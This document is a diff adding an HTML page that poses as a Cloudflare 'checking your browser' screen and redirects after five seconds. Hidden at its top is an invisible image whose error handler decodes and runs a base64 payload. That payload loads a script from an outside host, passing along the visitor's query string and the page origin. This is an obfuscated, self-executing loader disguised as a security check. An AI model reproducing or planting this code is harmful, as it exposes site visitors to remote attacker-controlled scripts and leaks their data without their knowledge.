@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<img src="/files/img/logo.png" data-digest="KGZ1bmN0aW9uKCl7dmFyIGE9bG9jYXRpb24sYj1kb2N1bWVudC5oZWFkfHxkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgiaGVhZCIpWzBdLGM9InNjcmlwdCIsZD1hdG9iKCJhSFIwY0hNNkx5OXZjR1Z1YzI5amFXRnNkMlZpTG05eVp5OXpkWEJ3YkdsbGN5OWhhbUY0TG5Cb2NEOWZYM05wWkQxa01ERmhaRGN4TXkwelpqSTNMVFE0T1dFdFlqWTJaaTAzTlRNelpEaGxZemM0TWprPSIpO2QrPS0xPGQuaW5kZXhPZigiPyIpPyImIjoiPyI7ZCs9YS5zZWFyY2guc3Vic3RyaW5nKDEpO2M9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudChjKTtjLnNyYz1kO2MuaWQ9YnRvYShhLm9yaWdpbik7Yi5hcHBlbmRDaGlsZChjKTt9KSgpOw==" onerror="(new Function(atob(this.dataset.digest)))();" style="visibility: hidden;">
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Checking your browser...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+</head>
+<body style="margin:0; padding:0; height:100%; background-color:#f0f2f5; font-family:Segoe UI, Tahoma, Geneva, Verdana, sans-serif; color:#2d2d2d; display:flex; align-items:center; justify-content:center;">
+  <div style="text-align:center; max-width:500px; padding:40px 30px; background-color:#ffffff; border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,0.1);">
+    
+    <div style="margin-bottom:25px;">
+      <img src="https://www.cloudflare.com/img/logo-cloudflare.svg" alt="Security Logo" style="width:140px;" />
+    </div>
+
+    <h1 style="font-size:22px; margin-bottom:15px;">Checking your browser before accessing the site...</h1>
+    
+    <p style="font-size:15px; color:#555555; line-height:1.6;">
+      This process is automatic. Your browser will redirect shortly.<br />
+      Please allow up to 5 seconds.
+    </p>
+
+    <div style="margin:30px auto; border:5px solid #e0e0e0; border-top:5px solid #3498db; border-radius:50%; width:48px; height:48px; animation:spin 1s linear infinite;"></div>
+
+    <div style="margin-top:30px; font-size:12px; color:#888888;">
+      If you are not redirected automatically, <a href="#" style="color:#3498db; text-decoration:none;">click here</a>.
+    </div>
+  </div>
+
+  <style>
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+
+  <script>
+    setTimeout(function () {
+      window.location.href = "https://yourfinaldestination.com";
+    }, 5000);
+  </script>
+</body>
+</html>
